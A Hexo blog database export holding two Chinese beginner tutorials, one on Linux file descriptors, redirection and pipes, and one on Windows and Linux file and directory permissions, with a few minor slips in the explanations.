输出重定向：`>`、`>>`\n>\n> 错误重定向：`2>`、`2>>`\n\n例如`cat test1.txt > test2.txt`，就是把标识符为1的内存空间绑定的对象从显示器更改为了文件。其他同理。\n\n![](文件描述符、重定向、管道浅析\\QQ截图20190329140403.png)\n\n对于`0>&1`这种操作的理解：\n\n> 意思是将标识符为0的内存空间要绑定的对象改为标识符为1的内存空间**当前**绑定的对象。\n>\n> 注意，是当前的，意味是如果之后标识符为1的内存空间改变了绑定对象，并不会导致标识符为0的内存空间改变绑定对象。\n\n**管道**\n\n管道也可以理解为一块内存空间，这块内存空间绑定着前一个进程的标识符为1的内存空间以及后一个进程标识符为0的内存空间。即前一个进程输出的数据作为后一个进程的输入数据。\n\n![](文件描述符、重定向、管道浅析\\QQ截图20190329142637.png)\n\n**参考资料：**\n\nhttps://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/\n\n","slug":"文件描述符、重定向、管道浅析","published":1,"updated":"2019-03-29T07:11:09.585Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83lc00327or0s3v9ysdu","content":"<h3 id=\"0x00-前面的话\"><a href=\"#0x00-前面的话\" class=\"headerlink\" title=\"0x00 前面的话\"></a>0x00 前面的话</h3><p>以下只是自己的理解以及为了让自己容易去理解，并不保证完全正确性。</p>\n<h3 id=\"0x01-重定向、文件描述符、管道\"><a href=\"#0x01-重定向、文件描述符、管道\" class=\"headerlink\" title=\"0x01 重定向、文件描述符、管道\"></a>0x01 重定向、文件描述符、管道</h3><p><strong>文件描述符</strong></p>\n<blockquote>\n<p>首先，Linux的哲学之一即一切皆文件。</p>\n<p>其次，系统若要操作一个文件，就必须明确的指定这个文件，这就涉及到如何标识文件。我们标识文件使用的是文件名，但文件名只是为了用户可读性，但是计算机不同，计算机考虑的是性能而不是可读性。</p>\n<p>Linux使用文件描述符来标识一个文件，文件描述符实际是一个数字，不同的文件使用不同的数字来标识，Windows类似的是文件句柄。</p>\n<p>在使用文件描述符时，直接使用会与真正的数字产生歧义，因此通过在数字之前使用<code>&amp;</code>来标识该数字是文件描述符。</p>\n</blockquote>\n<a id=\"more\"></a>\n<p>每个程序在运行前都会打开三个文件，分别是标准输入、标准输出、标准错误输出，文件描述符分别为0，1，2。</p>\n<blockquote>\n<p>我们把这三个文件当作三块内存空间，系统用0，1，2来标识这三块内存空间，程序从文件描述符为0的内存空间读取数据作为程序的输入，把程序输出的数据输出到文件描述符为1的内存空间中，把错误信息输出到文件描述符为2的内存空间中。</p>\n</blockquote>\n<p>简单说就是，程序在运行前会分配三块内存空间，然后分别标识为0，1，2，然后程序在运行时只管从标识符为0的内存读取数据，向标识符为0的内存输出数据，向标识符为2的内存输出错误信息。</p>\n<p><img src=\"/2019/03/29/文件描述符、重定向、管道浅析/QQ截图20190329135059.png\" alt></p>\n<p>两个问题：</p>\n<ol>\n<li><p>不同的程序使用一样的0，1，2文件描述符来标识会导致混乱吗？</p>\n<blockquote>\n<p>不用担心一样的标识会导致混乱，因为我们知道进程之间的内存空间是隔离独立的。</p>\n</blockquote>\n</li>\n<li><p>为什么要用三块内存作为中间区域，以及为什么都规定它们的文件描述符为0，1，2？</p>\n<blockquote>\n<p>首先，采用中间区域的区域我想作用就是作为缓冲区。</p>\n<p>其次，之所以都要使用0，1，2来标识，我觉得可以从用户的角度出发，用户只需要操作0，1，2这三个文件操作符接口就可以了，至于这三个内存区域绑定了哪个文件就交给操作系统了。假设，如果这个过程交给用户，那么用户想要把数据输出打印到屏幕上，那么首先得获取显示器对应的文件描述符，而把这个过程交给操作系统，然后操作系统提供一个接口（即0，1，2文件描述符）给用户使用，大大减小了用户的工作。</p>\n</blockquote>\n</li>\n</ol>\n<p><strong>重定向</strong></p>\n<p>根据上面我们的理解可知，程序只管对标识符为0,1,2的内存空间进行操作。那么有几个问题，程序从标识符为0的内存空间中读取数据，那么谁又向该内存空间写入数据呢？总不可能凭空产生吧。程序向标识符为1的内存空间输出数据，那么谁又会从该内存空间读取并使用里面的数据呢？标准错误输出同理。</p>\n<p>为了解决上面的问题，这三块内存区域还应该与其他东西绑定，它们用于向这三块内存区域写入或读取数据。默认情况下，与标识符为0的内存空间绑定的标准输入设备就是键盘，与标识符为1的内存空间绑定的标准输出设备就是显示器，与标识符为2的内存空间绑定的标准错误输出设备也是显示器。</p>\n<p><img src=\"/2019/03/29/文件描述符、重定向、管道浅析/QQ截图20190329135933.png\" alt></p>\n<p>接下来我们回到这节的重点：重定向。</p>\n<p>重定向可以理解为更改这三块内存空间绑定的对象。</p>\n<blockquote>\n<p>输入重定向：<code>&lt;</code></p>\n<p>输出重定向：<code>&gt;</code>、<code>&gt;&gt;</code></p>\n<p>错误重定向：<code>2&gt;</code>、<code>2&gt;&gt;</code></p>\n</blockquote>\n<p>例如<code>cat test1.txt &gt; test2.txt</code>，就是把标识符为1的内存空间绑定的对象从显示器更改为了文件。其他同理。</p>\n<p><img src=\"/2019/03/29/文件描述符、重定向、管道浅析/QQ截图20190329140403.png\" alt></p>\n<p>对于<code>0&gt;&amp;1</code>这种操作的理解：</p>\n<blockquote>\n<p>意思是将标识符为0的内存空间要绑定的对象改为标识符为1的内存空间<strong>当前</strong>绑定的对象。</p>\n<p>注意，是当前的，意味是如果之后标识符为1的内存空间改变了绑定对象，并不会导致标识符为0的内存空间改变绑定对象。</p>\n</blockquote>\n<p><strong>管道</strong></p>\n<p>管道也可以理解为一块内存空间，这块内存空间绑定着前一个进程的标识符为1的内存空间以及后一个进程标识符为0的内存空间。即前一个进程输出的数据作为后一个进程的输入数据。</p>\n<p><img src=\"/2019/03/29/文件描述符、重定向、管道浅析/QQ截图20190329142637.png\" alt></p>\n<p><strong>参考资料：</strong></p>\n<p><a href=\"https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</a></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-前面的话\"><a href=\"#0x00-前面的话\" class=\"headerlink\" title=\"0x00 前面的话\"></a>0x00 前面的话</h3><p>以下只是自己的理解以及为了让自己容易去理解，并不保证完全正确性。</p>\n<h3 id=\"0x01-重定向、文件描述符、管道\"><a href=\"#0x01-重定向、文件描述符、管道\" class=\"headerlink\" title=\"0x01 重定向、文件描述符、管道\"></a>0x01 重定向、文件描述符、管道</h3><p><strong>文件描述符</strong></p>\n<blockquote>\n<p>首先，Linux的哲学之一即一切皆文件。</p>\n<p>其次，系统若要操作一个文件，就必须明确的指定这个文件，这就涉及到如何标识文件。我们标识文件使用的是文件名，但文件名只是为了用户可读性，但是计算机不同，计算机考虑的是性能而不是可读性。</p>\n<p>Linux使用文件描述符来标识一个文件，文件描述符实际是一个数字，不同的文件使用不同的数字来标识，Windows类似的是文件句柄。</p>\n<p>在使用文件描述符时，直接使用会与真正的数字产生歧义，因此通过在数字之前使用<code>&amp;</code>来标识该数字是文件描述符。</p>\n</blockquote>","more":"<p>每个程序在运行前都会打开三个文件，分别是标准输入、标准输出、标准错误输出，文件描述符分别为0，1，2。</p>\n<blockquote>\n<p>我们把这三个文件当作三块内存空间，系统用0，1，2来标识这三块内存空间，程序从文件描述符为0的内存空间读取数据作为程序的输入，把程序输出的数据输出到文件描述符为1的内存空间中，把错误信息输出到文件描述符为2的内存空间中。</p>\n</blockquote>\n<p>简单说就是，程序在运行前会分配三块内存空间，然后分别标识为0，1，2，然后程序在运行时只管从标识符为0的内存读取数据，向标识符为0的内存输出数据，向标识符为2的内存输出错误信息。</p>\n<p><img src=\"/2019/03/29/文件描述符、重定向、管道浅析/QQ截图20190329135059.png\" alt></p>\n<p>两个问题：</p>\n<ol>\n<li><p>不同的程序使用一样的0，1，2文件描述符来标识会导致混乱吗？</p>\n<blockquote>\n<p>不用担心一样的标识会导致混乱，因为我们知道进程之间的内存空间是隔离独立的。</p>\n</blockquote>\n</li>\n<li><p>为什么要用三块内存作为中间区域，以及为什么都规定它们的文件描述符为0，1，2？</p>\n<blockquote>\n<p>首先，采用中间区域的区域我想作用就是作为缓冲区。</p>\n<p>其次，之所以都要使用0，1，2来标识，我觉得可以从用户的角度出发，用户只需要操作0，1，2这三个文件操作符接口就可以了，至于这三个内存区域绑定了哪个文件就交给操作系统了。假设，如果这个过程交给用户，那么用户想要把数据输出打印到屏幕上，那么首先得获取显示器对应的文件描述符，而把这个过程交给操作系统，然后操作系统提供一个接口（即0，1，2文件描述符）给用户使用，大大减小了用户的工作。</p>\n</blockquote>\n</li>\n</ol>\n<p><strong>重定向</strong></p>\n<p>根据上面我们的理解可知，程序只管对标识符为0,1,2的内存空间进行操作。那么有几个问题，程序从标识符为0的内存空间中读取数据，那么谁又向该内存空间写入数据呢？总不可能凭空产生吧。程序向标识符为1的内存空间输出数据，那么谁又会从该内存空间读取并使用里面的数据呢？标准错误输出同理。</p>\n<p>为了解决上面的问题，这三块内存区域还应该与其他东西绑定，它们用于向这三块内存区域写入或读取数据。默认情况下，与标识符为0的内存空间绑定的标准输入设备就是键盘，与标识符为1的内存空间绑定的标准输出设备就是显示器，与标识符为2的内存空间绑定的标准错误输出设备也是显示器。</p>\n<p><img src=\"/2019/03/29/文件描述符、重定向、管道浅析/QQ截图20190329135933.png\" alt></p>\n<p>接下来我们回到这节的重点：重定向。</p>\n<p>重定向可以理解为更改这三块内存空间绑定的对象。</p>\n<blockquote>\n<p>输入重定向：<code>&lt;</code></p>\n<p>输出重定向：<code>&gt;</code>、<code>&gt;&gt;</code></p>\n<p>错误重定向：<code>2&gt;</code>、<code>2&gt;&gt;</code></p>\n</blockquote>\n<p>例如<code>cat test1.txt &gt; test2.txt</code>，就是把标识符为1的内存空间绑定的对象从显示器更改为了文件。其他同理。</p>\n<p><img src=\"/2019/03/29/文件描述符、重定向、管道浅析/QQ截图20190329140403.png\" alt></p>\n<p>对于<code>0&gt;&amp;1</code>这种操作的理解：</p>\n<blockquote>\n<p>意思是将标识符为0的内存空间要绑定的对象改为标识符为1的内存空间<strong>当前</strong>绑定的对象。</p>\n<p>注意，是当前的，意味是如果之后标识符为1的内存空间改变了绑定对象，并不会导致标识符为0的内存空间改变绑定对象。</p>\n</blockquote>\n<p><strong>管道</strong></p>\n<p>管道也可以理解为一块内存空间，这块内存空间绑定着前一个进程的标识符为1的内存空间以及后一个进程标识符为0的内存空间。即前一个进程输出的数据作为后一个进程的输入数据。</p>\n<p><img src=\"/2019/03/29/文件描述符、重定向、管道浅析/QQ截图20190329142637.png\" alt></p>\n<p><strong>参考资料：</strong></p>\n<p><a href=\"https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</a></p>"},{"title":"文件与目录权限","date":"2019-02-28T00:58:56.000Z","_content":"\n## 0x00 Windows文件与文件夹权限\n\n| 权限           | 对于文件夹                                                   | 对于文件                                                     |\n| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 读取           | 允许查看并列出文件和子文件夹（Viewing、Listing）             | 允许查看和访问文件内容（Viewing、Accessing）                 |\n| 写入           | 允许添加文件和子文件夹(Adding)                               | 允许写入一个文件(Writing)                                    |\n| 读取和执行     | 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 由文件和文件夹继承 | 允许查看和访问文件的内容以及执行文件（Viewing、Accessing、Excuting） |\n| 列出文件夹内容 | 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 仅由文件夹继承 | N / A                                                        |\n| 修改           | 允许读取和写入文件和子文件夹（Reading、Writing）; 允许删除文件夹(Delete) | 允许读取和写入文件(Reading、Writing); 允许删除文件（Delete） |\n| 完全控制       | 允许读取，写入，更改和删除文件和子文件夹(Reading、Writing、Changing、Deleting) | 允许读取，写入，更改和删除文件(Reading、Writing、Deleting)   |\n\n<!-- more -->\n\n- **读取(Reading)是运行脚本(Run script)所需的唯一权限。执行（Excuting）权限无关紧要。**\n\n> Windows依据文件后缀来识别文件类型。如可执行程序：.exe、.bat、.com等。\n>\n> Linux通过\"x\"权限属性标识是否可执行。\n>\n> ------\n>\n> 脚本是由脚本语言编写的文件，脚本语言无需进行编译就可以通过解释器解释运行。\n\n- **授予用户写入文件但不删除文件的权限不能阻止用户删除文件的内容。用户仍然可以删除内容。**\n- **如果用户完全控制文件夹，则无论文件的权限如何，用户都可以删除文件夹中的文件。**\n\n**Windows文件或文件夹权限查看**\n\n右键文件或文件夹 ——> 属性 ——> 安全。\n\n![](文件与目录权限\\QQ截图20190228092238.png)\n\n**参考链接：**\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)\n\n## 0x01 Linux文件及目录权限\n\nLinux权限是针对文件内容设计的，对于文件和目录而言，文件内容代指不同的东西：\n\n- 文件：文件内容是文件存储的data。\n- 目录：文件内容是目录下的文件名。\n\n| 对象 |    文件内容    |            r             |                     w                      |        x         |\n| :--: | :------------: | :----------------------: | :----------------------------------------: | :--------------: |\n| 文件 |  文件内的数据  |      可读取文件内容      | 修改文件内容（编辑、增、改、不能删除文件） |     执行文件     |\n| 目录 | 目录下的文件名 | 可读取看到目录下的文件名 |               可异动目录结构               | 可进入目录的权限 |\n\n**权限对于目录：**\n\n- **r**\n\n> 读取文件结构的权限，即可以获得目录下的文件名清单。可执行`ls`命令。\n\n- **w**\n\n> 创建文件或目录。（`touch`、`mkdir`）\n>\n> 删除文件或目录。（不论文件的权限如何）(`rm、rmdir`)\n>\n> 重命名文件或目录。（`cp`）\n>\n> 移动文件或目录。(`mv`)\n\n- **x**\n\n> 能否作为工作目录。工作目录即用户当前所在的路径就是当前的工作目录。即该权限就是能否进入该目录，即能否`cd`进去。\n\n**例子：**\n\n![](文件与目录权限\\QQ截图20190228101906.png)\n\n- **要操作一个目录下的文件，拥有进入该目录的权限是必需的，“x”权限相当于key。“r”权限不是必需的，就像摸黑到书房取书，进入书房的钥匙是必需的，但是可以不用看到书架上的书名。没有“r”权限，命令里路径将不能补全。**\n- **因此在搭建WEB服务器时，运行HTTP服务的用户对网站的根目录应该具有\"rx\"权限。具体权限配置可参考连接：**https://www.cnblogs.com/sochishun/p/7413572.html\n\n**改变文件权限：**\n\n![](文件与目录权限\\QQ截图20190228105825.png)","source":"_posts/文件与目录权限.md","raw":"---\ntitle: 文件与目录权限\ndate: 2019-02-28 08:58:56\ntags:\n\t- 文件权限\ncategories: Misc\n---\n\n## 0x00 Windows文件与文件夹权限\n\n| 权限           | 对于文件夹                                                   | 对于文件                                                     |\n| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 读取           | 允许查看并列出文件和子文件夹（Viewing、Listing）             | 允许查看和访问文件内容（Viewing、Accessing）                 |\n| 写入           | 允许添加文件和子文件夹(Adding)                               | 允许写入一个文件(Writing)                                    |\n| 读取和执行     | 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 由文件和文件夹继承 | 允许查看和访问文件的内容以及执行文件（Viewing、Accessing、Excuting） |\n| 列出文件夹内容 | 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 仅由文件夹继承 | N / A                                                        |\n| 修改           | 允许读取和写入文件和子文件夹（Reading、Writing）; 允许删除文件夹(Delete) | 允许读取和写入文件(Reading、Writing); 允许删除文件（Delete） |\n| 完全控制       | 允许读取，写入，更改和删除文件和子文件夹(Reading、Writing、Changing、Deleting) | 允许读取，写入，更改和删除文件(Reading、Writing、Deleting)   |\n\n<!-- more -->\n\n- **读取(Reading)是运行脚本(Run script)所需的唯一权限。执行（Excuting）权限无关紧要。**\n\n> Windows依据文件后缀来识别文件类型。如可执行程序：.exe、.bat、.com等。\n>\n> Linux通过\"x\"权限属性标识是否可执行。\n>\n> ------\n>\n> 脚本是由脚本语言编写的文件，脚本语言无需进行编译就可以通过解释器解释运行。\n\n- **授予用户写入文件但不删除文件的权限不能阻止用户删除文件的内容。用户仍然可以删除内容。**\n- **如果用户完全控制文件夹，则无论文件的权限如何，用户都可以删除文件夹中的文件。**\n\n**Windows文件或文件夹权限查看**\n\n右键文件或文件夹 ——> 属性 ——> 安全。\n\n![](文件与目录权限\\QQ截图20190228092238.png)\n\n**参考链接：**\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)\n\n## 0x01 Linux文件及目录权限\n\nLinux权限是针对文件内容设计的，对于文件和目录而言，文件内容代指不同的东西：\n\n- 文件：文件内容是文件存储的data。\n- 目录：文件内容是目录下的文件名。\n\n| 对象 |    文件内容    |            r             |                     w                      |        x         |\n| :--: | :------------: | :----------------------: | :----------------------------------------: | :--------------: |\n| 文件 |  文件内的数据  |      可读取文件内容      | 修改文件内容（编辑、增、改、不能删除文件） |     执行文件     |\n| 目录 | 目录下的文件名 | 可读取看到目录下的文件名 |               可异动目录结构               | 可进入目录的权限 |\n\n**权限对于目录：**\n\n- **r**\n\n> 读取文件结构的权限，即可以获得目录下的文件名清单。可执行`ls`命令。\n\n- **w**\n\n> 创建文件或目录。（`touch`、`mkdir`）\n>\n> 删除文件或目录。（不论文件的权限如何）(`rm、rmdir`)\n>\n> 重命名文件或目录。（`cp`）\n>\n> 移动文件或目录。(`mv`)\n\n- **x**\n\n> 能否作为工作目录。工作目录即用户当前所在的路径就是当前的工作目录。即该权限就是能否进入该目录，即能否`cd`进去。\n\n**例子：**\n\n![](文件与目录权限\\QQ截图20190228101906.png)\n\n- **要操作一个目录下的文件，拥有进入该目录的权限是必需的，“x”权限相当于key。“r”权限不是必需的，就像摸黑到书房取书，进入书房的钥匙是必需的，但是可以不用看到书架上的书名。没有“r”权限，命令里路径将不能补全。**\n- **因此在搭建WEB服务器时，运行HTTP服务的用户对网站的根目录应该具有\"rx\"权限。具体权限配置可参考连接：**https://www.cnblogs.com/sochishun/p/7413572.html\n\n**改变文件权限：**\n\n![](文件与目录权限\\QQ截图20190228105825.png)","slug":"文件与目录权限","published":1,"updated":"2019-03-12T05:26:03.819Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83le00367or05lm3p1l1","content":"<h2 id=\"0x00-Windows文件与文件夹权限\"><a href=\"#0x00-Windows文件与文件夹权限\" class=\"headerlink\" title=\"0x00 Windows文件与文件夹权限\"></a>0x00 Windows文件与文件夹权限</h2><table>\n<thead>\n<tr>\n<th>权限</th>\n<th>对于文件夹</th>\n<th>对于文件</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>读取</td>\n<td>允许查看并列出文件和子文件夹（Viewing、Listing）</td>\n<td>允许查看和访问文件内容（Viewing、Accessing）</td>\n</tr>\n<tr>\n<td>写入</td>\n<td>允许添加文件和子文件夹(Adding)</td>\n<td>允许写入一个文件(Writing)</td>\n</tr>\n<tr>\n<td>读取和执行</td>\n<td>允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 由文件和文件夹继承</td>\n<td>允许查看和访问文件的内容以及执行文件（Viewing、Accessing、Excuting）</td>\n</tr>\n<tr>\n<td>列出文件夹内容</td>\n<td>允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 仅由文件夹继承</td>\n<td>N / A</td>\n</tr>\n<tr>\n<td>修改</td>\n<td>允许读取和写入文件和子文件夹（Reading、Writing）; 允许删除文件夹(Delete)</td>\n<td>允许读取和写入文件(Reading、Writing); 允许删除文件（Delete）</td>\n</tr>\n<tr>\n<td>完全控制</td>\n<td>允许读取，写入，更改和删除文件和子文件夹(Reading、Writing、Changing、Deleting)</td>\n<td>允许读取，写入，更改和删除文件(Reading、Writing、Deleting)</td>\n</tr>\n</tbody>\n</table>\n<a id=\"more\"></a>\n<ul>\n<li><strong>读取(Reading)是运行脚本(Run script)所需的唯一权限。执行（Excuting）权限无关紧要。</strong></li>\n</ul>\n<blockquote>\n<p>Windows依据文件后缀来识别文件类型。如可执行程序：.exe、.bat、.com等。</p>\n<p>Linux通过”x”权限属性标识是否可执行。</p>\n<hr>\n<p>脚本是由脚本语言编写的文件，脚本语言无需进行编译就可以通过解释器解释运行。</p>\n</blockquote>\n<ul>\n<li><strong>授予用户写入文件但不删除文件的权限不能阻止用户删除文件的内容。用户仍然可以删除内容。</strong></li>\n<li><strong>如果用户完全控制文件夹，则无论文件的权限如何，用户都可以删除文件夹中的文件。</strong></li>\n</ul>\n<p><strong>Windows文件或文件夹权限查看</strong></p>\n<p>右键文件或文件夹 ——&gt; 属性 ——&gt; 安全。</p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228092238.png\" alt></p>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)</a></p>\n<h2 id=\"0x01-Linux文件及目录权限\"><a href=\"#0x01-Linux文件及目录权限\" class=\"headerlink\" title=\"0x01 Linux文件及目录权限\"></a>0x01 Linux文件及目录权限</h2><p>Linux权限是针对文件内容设计的，对于文件和目录而言，文件内容代指不同的东西：</p>\n<ul>\n<li>文件：文件内容是文件存储的data。</li>\n<li>目录：文件内容是目录下的文件名。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">对象</th>\n<th style=\"text-align:center\">文件内容</th>\n<th style=\"text-align:center\">r</th>\n<th style=\"text-align:center\">w</th>\n<th style=\"text-align:center\">x</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">文件</td>\n<td style=\"text-align:center\">文件内的数据</td>\n<td style=\"text-align:center\">可读取文件内容</td>\n<td style=\"text-align:center\">修改文件内容（编辑、增、改、不能删除文件）</td>\n<td style=\"text-align:center\">执行文件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">目录</td>\n<td style=\"text-align:center\">目录下的文件名</td>\n<td style=\"text-align:center\">可读取看到目录下的文件名</td>\n<td style=\"text-align:center\">可异动目录结构</td>\n<td style=\"text-align:center\">可进入目录的权限</td>\n</tr>\n</tbody>\n</table>\n<p><strong>权限对于目录：</strong></p>\n<ul>\n<li><strong>r</strong></li>\n</ul>\n<blockquote>\n<p>读取文件结构的权限，即可以获得目录下的文件名清单。可执行<code>ls</code>命令。</p>\n</blockquote>\n<ul>\n<li><strong>w</strong></li>\n</ul>\n<blockquote>\n<p>创建文件或目录。（<code>touch</code>、<code>mkdir</code>）</p>\n<p>删除文件或目录。（不论文件的权限如何）(<code>rm、rmdir</code>)</p>\n<p>重命名文件或目录。（<code>cp</code>）</p>\n<p>移动文件或目录。(<code>mv</code>)</p>\n</blockquote>\n<ul>\n<li><strong>x</strong></li>\n</ul>\n<blockquote>\n<p>能否作为工作目录。工作目录即用户当前所在的路径就是当前的工作目录。即该权限就是能否进入该目录，即能否<code>cd</code>进去。</p>\n</blockquote>\n<p><strong>例子：</strong></p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228101906.png\" alt></p>\n<ul>\n<li><strong>要操作一个目录下的文件，拥有进入该目录的权限是必需的，“x”权限相当于key。“r”权限不是必需的，就像摸黑到书房取书，进入书房的钥匙是必需的，但是可以不用看到书架上的书名。没有“r”权限，命令里路径将不能补全。</strong></li>\n<li><strong>因此在搭建WEB服务器时，运行HTTP服务的用户对网站的根目录应该具有”rx”权限。具体权限配置可参考连接：</strong><a href=\"https://www.cnblogs.com/sochishun/p/7413572.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/sochishun/p/7413572.html</a></li>\n</ul>\n<p><strong>改变文件权限：</strong></p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228105825.png\" alt></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-Windows文件与文件夹权限\"><a href=\"#0x00-Windows文件与文件夹权限\" class=\"headerlink\" title=\"0x00 Windows文件与文件夹权限\"></a>0x00 Windows文件与文件夹权限</h2><table>\n<thead>\n<tr>\n<th>权限</th>\n<th>对于文件夹</th>\n<th>对于文件</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>读取</td>\n<td>允许查看并列出文件和子文件夹（Viewing、Listing）</td>\n<td>允许查看和访问文件内容（Viewing、Accessing）</td>\n</tr>\n<tr>\n<td>写入</td>\n<td>允许添加文件和子文件夹(Adding)</td>\n<td>允许写入一个文件(Writing)</td>\n</tr>\n<tr>\n<td>读取和执行</td>\n<td>允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 由文件和文件夹继承</td>\n<td>允许查看和访问文件的内容以及执行文件（Viewing、Accessing、Excuting）</td>\n</tr>\n<tr>\n<td>列出文件夹内容</td>\n<td>允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 仅由文件夹继承</td>\n<td>N / A</td>\n</tr>\n<tr>\n<td>修改</td>\n<td>允许读取和写入文件和子文件夹（Reading、Writing）; 允许删除文件夹(Delete)</td>\n<td>允许读取和写入文件(Reading、Writing); 允许删除文件（Delete）</td>\n</tr>\n<tr>\n<td>完全控制</td>\n<td>允许读取，写入，更改和删除文件和子文件夹(Reading、Writing、Changing、Deleting)</td>\n<td>允许读取，写入，更改和删除文件(Reading、Writing、Deleting)</td>\n</tr>\n</tbody>\n</table>","more":"<ul>\n<li><strong>读取(Reading)是运行脚本(Run script)所需的唯一权限。执行（Excuting）权限无关紧要。</strong></li>\n</ul>\n<blockquote>\n<p>Windows依据文件后缀来识别文件类型。如可执行程序：.exe、.bat、.com等。</p>\n<p>Linux通过”x”权限属性标识是否可执行。</p>\n<hr>\n<p>脚本是由脚本语言编写的文件，脚本语言无需进行编译就可以通过解释器解释运行。</p>\n</blockquote>\n<ul>\n<li><strong>授予用户写入文件但不删除文件的权限不能阻止用户删除文件的内容。用户仍然可以删除内容。</strong></li>\n<li><strong>如果用户完全控制文件夹，则无论文件的权限如何，用户都可以删除文件夹中的文件。</strong></li>\n</ul>\n<p><strong>Windows文件或文件夹权限查看</strong></p>\n<p>右键文件或文件夹 ——&gt; 属性 ——&gt; 安全。</p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228092238.png\" alt></p>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)</a></p>\n<h2 id=\"0x01-Linux文件及目录权限\"><a href=\"#0x01-Linux文件及目录权限\" class=\"headerlink\" title=\"0x01 Linux文件及目录权限\"></a>0x01 Linux文件及目录权限</h2><p>Linux权限是针对文件内容设计的，对于文件和目录而言，文件内容代指不同的东西：</p>\n<ul>\n<li>文件：文件内容是文件存储的data。</li>\n<li>目录：文件内容是目录下的文件名。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">对象</th>\n<th style=\"text-align:center\">文件内容</th>\n<th style=\"text-align:center\">r</th>\n<th style=\"text-align:center\">w</th>\n<th style=\"text-align:center\">x</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">文件</td>\n<td style=\"text-align:center\">文件内的数据</td>\n<td style=\"text-align:center\">可读取文件内容</td>\n<td style=\"text-align:center\">修改文件内容（编辑、增、改、不能删除文件）</td>\n<td style=\"text-align:center\">执行文件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">目录</td>\n<td style=\"text-align:center\">目录下的文件名</td>\n<td style=\"text-align:center\">可读取看到目录下的文件名</td>\n<td style=\"text-align:center\">可异动目录结构</td>\n<td style=\"text-align:center\">可进入目录的权限</td>\n</tr>\n</tbody>\n</table>\n<p><strong>权限对于目录：</strong></p>\n<ul>\n<li><strong>r</strong></li>\n</ul>\n<blockquote>\n<p>读取文件结构的权限，即可以获得目录下的文件名清单。可执行<code>ls</code>命令。</p>\n</blockquote>\n<ul>\n<li><strong>w</strong></li>\n</ul>\n<blockquote>\n<p>创建文件或目录。（<code>touch</code>、<code>mkdir</code>）</p>\n<p>删除文件或目录。（不论文件的权限如何）(<code>rm、rmdir</code>)</p>\n<p>重命名文件或目录。（<code>cp</code>）</p>\n<p>移动文件或目录。(<code>mv</code>)</p>\n</blockquote>\n<ul>\n<li><strong>x</strong></li>\n</ul>\n<blockquote>\n<p>能否作为工作目录。工作目录即用户当前所在的路径就是当前的工作目录。即该权限就是能否进入该目录，即能否<code>cd</code>进去。</p>\n</blockquote>\n<p><strong>例子：</strong></p>\n<p><img 